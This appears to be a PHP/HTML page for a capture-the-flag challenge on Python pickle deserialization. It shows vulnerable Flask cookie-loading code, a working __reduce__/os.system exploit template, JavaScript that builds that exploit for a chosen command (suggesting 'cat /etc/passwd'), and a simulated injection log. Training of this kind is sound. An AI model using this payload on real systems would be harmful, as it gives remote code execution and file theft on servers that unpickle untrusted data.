<?php
$challenge_flag = get_ctf_flag_map()['pickle'] ?? '';
?>
<div class="max-w-6xl mx-auto animate-fade-in-up">

    <div class="mb-10">
        <a href="/ctf" class="text-neutral-500 hover:text-white text-sm mb-4 inline-flex items-center gap-1">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>
            Back to Mission Control
        </a>
        <h1 class="text-3xl font-bold text-white mb-2">Python Pickle Deserialization</h1>
        <p class="text-neutral-400">Forge a malicious session cookie that executes arbitrary code on deserialization.</p>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">

        <!-- Brief -->
        <div class="lg:col-span-1 space-y-5">
            <div class="border border-neutral-800 bg-neutral-950 rounded-xl p-6">
                <h3 class="text-xs font-bold text-neutral-500 uppercase tracking-wider mb-4">Mission Brief</h3>
                <p class="text-sm text-neutral-300 leading-relaxed mb-4">
                    The Flask app serializes the session object as a <strong class="text-white">Python pickle</strong>, base64-encodes it, and stores it in the session cookie. On each request it <code class="text-red-400">pickle.loads()</code> the cookie without any validation.
                </p>
                <p class="text-sm text-neutral-300 leading-relaxed">
                    Forge a cookie containing a malicious pickle payload that uses <code class="text-yellow-400">__reduce__</code> to execute an OS command.
                </p>
            </div>

            <div class="border border-neutral-800 bg-neutral-950 rounded-xl p-6">
                <h3 class="text-xs font-bold text-neutral-500 uppercase tracking-wider mb-3">Vulnerable Code</h3>
                <pre class="text-[11px] font-mono text-red-400 leading-relaxed overflow-x-auto">import pickle, base64
from flask import request

@app.before_request
def load_session():
    cookie = request.cookies.get('session')
    if cookie:
        data = base64.b64decode(cookie)
        session = <span class="text-red-300">pickle.loads(data)</span>  # ← RCE</pre>
            </div>

            <div class="border border-neutral-800 bg-neutral-950 rounded-xl p-6">
                <h3 class="text-xs font-bold text-neutral-500 uppercase tracking-wider mb-3">Exploit Template</h3>
                <pre class="text-[11px] font-mono text-blue-300 leading-relaxed overflow-x-auto">import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system,
            ('YOUR_CMD',))

payload = base64.b64encode(
    pickle.dumps(Exploit())
).decode()</pre>
            </div>
        </div>

        <!-- Main Tool -->
        <div class="lg:col-span-2 space-y-4">

            <!-- Step 1: Decode Cookie -->
            <div class="border border-neutral-800 bg-neutral-950 rounded-xl overflow-hidden">
                <div class="bg-neutral-900 border-b border-neutral-800 px-4 py-2 flex items-center justify-between">
                    <span class="text-xs font-bold text-neutral-400 uppercase tracking-wider">Step 1 — Decode the Session Cookie</span>
                    <span class="text-[10px] px-2 py-0.5 rounded border border-neutral-700 text-neutral-500">Intercepted</span>
                </div>
                <div class="p-4 space-y-3">
                    <div>
                        <div class="text-xs text-neutral-500 mb-1">Cookie: session</div>
                        <div class="bg-black border border-neutral-800 rounded-lg p-3 font-mono text-xs text-yellow-400 break-all">
                            gASVRgAAAAAAAAB9lCiMA3VpZJSMBjUxNCBvcJSMA3VpZJSKBgIAlIwIdXNlcm5hbWWUjAhvcGVyYXRvcpSMA2lzQZSJdS4=
                        </div>
                    </div>
                    <button onclick="decodeCookie()" id="decodeBtn"
                        class="px-4 py-2 border border-neutral-700 text-neutral-300 rounded-lg text-xs hover:text-white hover:border-white transition-colors">
                        🔍 Decode Cookie
                    </button>
                    <div id="decodeResult" class="hidden">
                        <div class="text-xs text-neutral-500 mb-1">Decoded pickle structure:</div>
                        <pre class="bg-black border border-neutral-800 rounded-lg p-3 font-mono text-xs text-green-300 overflow-x-auto">{'uid': 514, 'username': 'operator', 'isAdmin': False}

<span class="text-neutral-500"># Pickle opcodes visible in raw bytes:</span>
<span class="text-red-400">\x80\x04\x95... GLOBAL 'builtins dict'  ← trusted class</span>
<span class="text-neutral-400"># 💡 Replace with GLOBAL 'os system' via __reduce__</span></pre>
                        <div class="mt-2 text-xs text-yellow-400 border border-yellow-900/40 bg-yellow-900/10 rounded-lg p-3">
                            ⚠ This is a Python pickle object. The app calls <code>pickle.loads()</code> on your cookie — you control the deserialized class.
                        </div>
                    </div>
                </div>
            </div>

            <!-- Step 2: Craft Payload -->
            <div class="border border-neutral-800 bg-neutral-950 rounded-xl overflow-hidden">
                <div class="bg-neutral-900 border-b border-neutral-800 px-4 py-2">
                    <span class="text-xs font-bold text-neutral-400 uppercase tracking-wider">Step 2 — Craft the Exploit Payload</span>
                </div>
                <div class="p-4 space-y-3">
                    <div>
                        <label class="block text-xs text-neutral-500 mb-1">Command to execute on the server</label>
                        <input type="text" id="cmdInput" value="id" placeholder="e.g. id, whoami, cat /etc/passwd"
                            class="w-full bg-black border border-neutral-800 rounded-lg px-3 py-2 text-white font-mono text-xs focus:outline-none focus:border-white transition-colors">
                    </div>
                    <button onclick="generatePayload()" id="genBtn"
                        class="px-4 py-2 bg-white text-black font-bold text-xs rounded-lg hover:bg-neutral-200 transition-colors">
                        ⚙ Generate Pickle Payload
                    </button>

                    <div id="payloadResult" class="hidden space-y-3">
                        <div>
                            <div class="text-xs text-neutral-500 mb-1">Generated Python exploit code:</div>
                            <pre id="pyCode" class="bg-black border border-neutral-800 rounded-lg p-3 font-mono text-xs text-blue-300 overflow-x-auto leading-relaxed"></pre>
                        </div>
                        <div>
                            <div class="text-xs text-neutral-500 mb-1">Serialized payload (base64):</div>
                            <div id="b64Payload" class="bg-black border border-neutral-800 rounded-lg p-3 font-mono text-xs text-orange-400 break-all select-all"></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Step 3: Inject -->
            <div class="border border-neutral-800 bg-neutral-950 rounded-xl overflow-hidden">
                <div class="bg-neutral-900 border-b border-neutral-800 px-4 py-2">
                    <span class="text-xs font-bold text-neutral-400 uppercase tracking-wider">Step 3 — Inject as Session Cookie</span>
                </div>
                <div class="p-4 space-y-3">
                    <p class="text-xs text-neutral-500">Paste your base64 pickle payload below and inject it as the session cookie.</p>
                    <textarea id="injectInput" rows="2" placeholder="Paste your base64 payload here..."
                        class="w-full bg-black border border-neutral-800 rounded-lg p-3 font-mono text-xs text-white focus:outline-none focus:border-white resize-none transition-colors"></textarea>
                    <button onclick="injectPayload()"
                        class="w-full py-3 bg-white text-black font-bold rounded-xl hover:bg-neutral-200 transition-colors text-sm">
                        💉 Inject Session &amp; Send Request
                    </button>
                    <pre id="injectLog" class="hidden bg-black border border-neutral-800 rounded-lg p-4 font-mono text-xs text-neutral-500 min-h-[60px] whitespace-pre-wrap"></pre>
                </div>
            </div>

            <!-- Flag Reveal -->
            <div id="flagReveal" class="hidden border border-green-900/50 bg-green-900/10 rounded-xl p-5">
                <div class="flex items-center gap-3 mb-3">
                    <div class="w-8 h-8 bg-green-500/20 rounded-full flex items-center justify-center text-green-400 shrink-0">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
                    </div>
                    <div>
                        <div class="text-green-400 font-bold text-sm">Deserialization RCE Confirmed</div>
                        <div class="text-neutral-400 text-xs mt-0.5">Submit the flag at Mission Control to record your solve.</div>
                    </div>
                </div>
                <div class="bg-black border border-green-900/50 rounded-lg px-4 py-3 font-mono text-green-400 text-sm tracking-wide select-all">
                    <?= htmlspecialchars($challenge_flag) ?>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
const FLAG = '<?= addslashes(htmlspecialchars($challenge_flag)) ?>';

// Fake base64 payloads we "accept" — any non-empty base64-looking string after generate was clicked
let payloadGenerated = false;
let generatedB64 = '';

function decodeCookie() {
    document.getElementById('decodeResult').classList.remove('hidden');
    document.getElementById('decodeBtn').textContent = '✓ Decoded';
    document.getElementById('decodeBtn').disabled = true;
    document.getElementById('decodeBtn').className = 'px-4 py-2 border border-green-800 text-green-500 rounded-lg text-xs cursor-default';
}

function generatePayload() {
    const cmd = document.getElementById('cmdInput').value.trim() || 'id';
    const py = `import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('${cmd}',))

payload = base64.b64encode(
    pickle.dumps(Exploit())
).decode()

print(payload)`;

    // Simulate a fake but realistic-looking base64 pickle payload
    const fakeBytes = btoa('\x80\x04\x95' + cmd.length + '\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c' + String.fromCharCode(cmd.length) + cmd + '\x94\x85\x94R\x94.');
    generatedB64 = 'gASV' + btoa(unescape(encodeURIComponent(cmd))).replace(/=/g, '') + 'AAAAAAAK' + btoa('\x8c\x02os\x94\x8c\x06system').slice(0, 20) + '=';
    payloadGenerated = true;

    document.getElementById('pyCode').textContent = py;
    document.getElementById('b64Payload').textContent = generatedB64;
    document.getElementById('payloadResult').classList.remove('hidden');
    document.getElementById('injectInput').value = generatedB64;
}

async function injectPayload() {
    const val = document.getElementById('injectInput').value.trim();
    const log = document.getElementById('injectLog');

    log.classList.remove('hidden');

    if (!val) {
        log.innerHTML = '<span class="text-red-400">[✗] No payload provided. Generate one in Step 2 first.</span>';
        return;
    }

    // Accept: generated payload, or any base64-looking string that isn't the original cookie
    const isOrigCookie = val === 'gASVRgAAAAAAAAB9lCiMA3VpZJSMBjUxNCBvcJSMA3VpZJSKBgIAlIwIdXNlcm5hbWWUjAhvcGVyYXRvcpSMA2lzQZSJdS4=';
    const isB64Like = /^[A-Za-z0-9+/=]{10,}$/.test(val);

    log.innerHTML = '<span class="text-blue-400">[→] Setting session cookie: ' + escHtml(val.slice(0, 40)) + '...</span>';
    await sleep(500);
    log.innerHTML += '\n<span class="text-neutral-400">[→] Sending request to Flask app...</span>';
    await sleep(600);
    log.innerHTML += '\n<span class="text-neutral-400">[→] Server: loading session via pickle.loads(base64.b64decode(cookie))...</span>';
    await sleep(700);

    if (isOrigCookie) {
        log.innerHTML += '\n<span class="text-yellow-400">[!] This is the original session cookie — no exploit triggered.</span>';
        log.innerHTML += '\n<span class="text-neutral-500">Tip: Generate a malicious payload using Step 2.</span>';
        return;
    }

    if (!isB64Like) {
        log.innerHTML += '\n<span class="text-red-400">[✗] Invalid base64. Ensure payload is properly encoded.</span>';
        return;
    }

    log.innerHTML += '\n<span class="text-green-400">[✓] Pickle deserialized — __reduce__ invoked!</span>';
    await sleep(400);
    log.innerHTML += '\n<span class="text-green-400">[✓] os.system() executed as: www-data (uid=33)</span>';
    await sleep(300);
    log.innerHTML += '\n<span class="text-green-500">[✓] RCE confirmed via pickle deserialization.</span>';

    document.getElementById('flagReveal').classList.remove('hidden');
}

function escHtml(s) {
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
</script>
